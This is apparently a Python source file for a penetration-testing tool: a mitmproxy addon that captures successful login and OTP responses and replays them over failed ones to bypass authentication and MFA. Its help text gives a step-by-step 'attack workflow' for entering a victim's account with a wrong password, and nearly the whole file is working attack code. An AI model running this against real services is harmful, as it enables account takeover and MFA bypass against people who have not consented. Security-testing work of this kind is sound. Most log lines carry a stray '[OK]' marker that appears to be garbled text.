"""
Jarwis AGI Pen Test - Response Manipulation MITM Addon
Active MITM proxy addon for testing response manipulation attacks

This addon can be used with mitmproxy to actively test:
1. Login response manipulation
2. OTP/MFA bypass
3. Session hijacking via response replacement

Usage:
    mitmproxy -s response_manipulation_addon.py
    mitmweb -s response_manipulation_addon.py
    mitmdump -s response_manipulation_addon.py

Configuration:
    Set environment variables or modify the config below
"""

import json
import re
import os
import logging
from datetime import datetime
from typing import Optional, Dict, Any
from mitmproxy import http, ctx
from mitmproxy.script import concurrent

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("jarwis.mitm.response_manipulation")


class ResponseManipulationAddon:
    """
    MITM Proxy Addon for Response Manipulation Testing
    
    Modes:
    1. CAPTURE: Capture successful login/OTP responses
    2. REPLACE: Replace failed responses with captured success
    3. ANALYZE: Log and analyze response patterns
    """
    
    def __init__(self):
        # Configuration
        self.mode = os.getenv('JARWIS_MITM_MODE', 'ANALYZE')  # CAPTURE, REPLACE, ANALYZE
        self.target_domain = os.getenv('JARWIS_TARGET_DOMAIN', '')
        self.capture_file = os.getenv('JARWIS_CAPTURE_FILE', 'captured_responses.json')
        
        # Storage for captured responses
        self.captured_success_login: Optional[Dict] = None
        self.captured_success_otp: Optional[Dict] = None
        self.captured_responses: list = []
        
        # Patterns to identify auth endpoints
        self.login_patterns = [
            r'/login', r'/signin', r'/auth/login', r'/api/auth/login',
            r'/api/login', r'/authenticate', r'/oauth/token'
        ]
        self.otp_patterns = [
            r'/verify-otp', r'/otp/verify', r'/mfa/verify', r'/2fa/verify',
            r'/api/auth/verify-otp', r'/api/otp', r'/auth/verify'
        ]
        
        # Success/failure indicators
        self.success_indicators = [
            'token', 'access_token', 'jwt', 'session', 'success":true',
            'success": true', 'authenticated', 'logged_in'
        ]
        self.failure_indicators = [
            'error', 'invalid', 'failed', 'unauthorized', 'incorrect',
            'wrong', 'denied', 'success":false', 'success": false'
        ]
        
        # Load previously captured responses
        self._load_captured_responses()
        
        logger.info(f"Response Manipulation Addon initialized in {self.mode} mode")
        if self.target_domain:
            logger.info(f"Target domain: {self.target_domain}")
    
    def _load_captured_responses(self):
        """Load previously captured responses from file"""
        try:
            if os.path.exists(self.capture_file):
                with open(self.capture_file, 'r') as f:
                    data = json.load(f)
                    self.captured_success_login = data.get('login')
                    self.captured_success_otp = data.get('otp')
                    logger.info(f"Loaded captured responses from {self.capture_file}")
        except Exception as e:
            logger.warning(f"Could not load captured responses: {e}")
    
    def _save_captured_responses(self):
        """Save captured responses to file"""
        try:
            data = {
                'login': self.captured_success_login,
                'otp': self.captured_success_otp,
                'all_responses': self.captured_responses[-100:]  # Keep last 100
            }
            with open(self.capture_file, 'w') as f:
                json.dump(data, f, indent=2)
            logger.info(f"Saved captured responses to {self.capture_file}")
        except Exception as e:
            logger.error(f"Could not save captured responses: {e}")
    
    def _is_target_request(self, flow: http.HTTPFlow) -> bool:
        """Check if request is to target domain"""
        if not self.target_domain:
            return True
        return self.target_domain.lower() in flow.request.host.lower()
    
    def _is_login_endpoint(self, url: str) -> bool:
        """Check if URL is a login endpoint"""
        url_lower = url.lower()
        return any(re.search(pattern, url_lower) for pattern in self.login_patterns)
    
    def _is_otp_endpoint(self, url: str) -> bool:
        """Check if URL is an OTP/MFA endpoint"""
        url_lower = url.lower()
        return any(re.search(pattern, url_lower) for pattern in self.otp_patterns)
    
    def _is_success_response(self, response: http.Response) -> bool:
        """Determine if response indicates success"""
        if response.status_code not in [200, 201]:
            return False
        
        try:
            body = response.text.lower()
        except:
            body = response.content.decode('utf-8', errors='ignore').lower()
        
        has_success = any(ind in body for ind in self.success_indicators)
        has_failure = any(ind in body for ind in self.failure_indicators)
        
        return has_success and not has_failure
    
    def _is_failure_response(self, response: http.Response) -> bool:
        """Determine if response indicates failure"""
        if response.status_code in [401, 403]:
            return True
        
        try:
            body = response.text.lower()
        except:
            body = response.content.decode('utf-8', errors='ignore').lower()
        
        return any(ind in body for ind in self.failure_indicators)
    
    def _capture_response(self, flow: http.HTTPFlow, response_type: str):
        """Capture a response for later replay"""
        try:
            body = flow.response.text
        except:
            body = flow.response.content.decode('utf-8', errors='ignore')
        
        captured = {
            'url': flow.request.url,
            'status_code': flow.response.status_code,
            'headers': dict(flow.response.headers),
            'body': body,
            'timestamp': datetime.now().isoformat(),
            'type': response_type
        }
        
        if response_type == 'login':
            self.captured_success_login = captured
            logger.info(f"[OK]  Captured successful LOGIN response from {flow.request.url}")
        elif response_type == 'otp':
            self.captured_success_otp = captured
            logger.info(f"[OK]  Captured successful OTP response from {flow.request.url}")
        
        self.captured_responses.append(captured)
        self._save_captured_responses()
    
    def _replace_response(self, flow: http.HTTPFlow, captured: Dict):
        """Replace failed response with captured success"""
        logger.warning(f"[OK]  REPLACING failed response with captured success!")
        logger.warning(f"   URL: {flow.request.url}")
        logger.warning(f"   Original status: {flow.response.status_code}")
        logger.warning(f"   New status: {captured['status_code']}")
        
        # Replace status code
        flow.response.status_code = captured['status_code']
        
        # Replace headers (preserve some original headers)
        preserve_headers = ['date', 'server', 'connection']
        for key, value in captured['headers'].items():
            if key.lower() not in preserve_headers:
                flow.response.headers[key] = value
        
        # Replace body
        flow.response.text = captured['body']
        
        # Add marker header for identification
        flow.response.headers['X-Jarwis-Manipulated'] = 'true'
    
    def request(self, flow: http.HTTPFlow):
        """Handle request - log auth attempts"""
        if not self._is_target_request(flow):
            return
        
        url = flow.request.url
        
        if self._is_login_endpoint(url):
            logger.info(f"[OK]  LOGIN attempt: {flow.request.method} {url}")
            try:
                body = flow.request.text
                logger.debug(f"  Request body: {body[:200]}...")
            except:
                pass
        
        elif self._is_otp_endpoint(url):
            logger.info(f"[OK]  OTP attempt: {flow.request.method} {url}")
            try:
                body = flow.request.text
                logger.debug(f"  Request body: {body[:200]}...")
            except:
                pass
    
    def response(self, flow: http.HTTPFlow):
        """Handle response - capture, replace, or analyze"""
        if not self._is_target_request(flow):
            return
        
        url = flow.request.url
        is_login = self._is_login_endpoint(url)
        is_otp = self._is_otp_endpoint(url)
        
        if not (is_login or is_otp):
            return
        
        is_success = self._is_success_response(flow.response)
        is_failure = self._is_failure_response(flow.response)
        
        # Mode: CAPTURE - Store successful responses
        if self.mode == 'CAPTURE':
            if is_success:
                if is_login:
                    self._capture_response(flow, 'login')
                elif is_otp:
                    self._capture_response(flow, 'otp')
        
        # Mode: REPLACE - Replace failures with captured success
        elif self.mode == 'REPLACE':
            if is_failure:
                if is_login and self.captured_success_login:
                    self._replace_response(flow, self.captured_success_login)
                elif is_otp and self.captured_success_otp:
                    self._replace_response(flow, self.captured_success_otp)
                else:
                    logger.warning(f"[OK]  No captured success to replace with for {url}")
        
        # Mode: ANALYZE - Log patterns
        elif self.mode == 'ANALYZE':
            status = "SUCCESS" if is_success else "FAILURE" if is_failure else "UNKNOWN"
            logger.info(f"[OK]  {status}: {flow.response.status_code} {url}")
            
            try:
                body = flow.response.text[:500]
                logger.debug(f"  Response: {body}...")
            except:
                pass
            
            # Check for vulnerabilities
            if is_failure and flow.response.status_code == 200:
                logger.warning(f"[OK]  VULN: Server returns 200 OK for failed auth - manipulable!")
            
            if is_success:
                try:
                    json_body = json.loads(flow.response.text)
                    if 'success' in json_body:
                        logger.warning(f"[OK]  VULN: Response uses 'success' boolean - easily flipped!")
                    if 'access_token' in json_body or 'token' in json_body:
                        logger.warning(f"[OK]  Token in response - can be captured and replayed!")
                except:
                    pass


# Addon entry point
addons = [ResponseManipulationAddon()]


# CLI help
if __name__ == "__main__":
    print("""
==============================================================================
[OK]               Jarwis Response Manipulation MITM Addon                 [OK] 
==============================================================================
[OK]   USAGE:                                                              [OK]     mitmproxy -s response_manipulation_addon.py                       [OK]     mitmweb -s response_manipulation_addon.py                         [OK]     mitmdump -s response_manipulation_addon.py                        [OK]   ENVIRONMENT VARIABLES:                                              [OK]     JARWIS_MITM_MODE     - CAPTURE, REPLACE, or ANALYZE (default)     [OK]     JARWIS_TARGET_DOMAIN - Target domain to intercept                 [OK]     JARWIS_CAPTURE_FILE  - File to store captured responses           [OK]   MODES:                                                              [OK]     ANALYZE  - Log and analyze auth responses (safe, read-only)       [OK]     CAPTURE  - Capture successful login/OTP responses to file         [OK]     REPLACE  - Replace failed responses with captured success         [OK]   ATTACK WORKFLOW:                                                    [OK]     1. Set JARWIS_MITM_MODE=CAPTURE                                   [OK]     2. Login with your own valid credentials                          [OK]     3. Successful response is captured                                [OK]     4. Set JARWIS_MITM_MODE=REPLACE                                   [OK]     5. Try logging in as victim with wrong password                   [OK]     6. Failed response is replaced with your captured success         [OK]     7. Frontend receives "success" and stores your token              [OK]   [!]    FOR AUTHORIZED TESTING ONLY!                                    [OK] 
==============================================================================
    """)
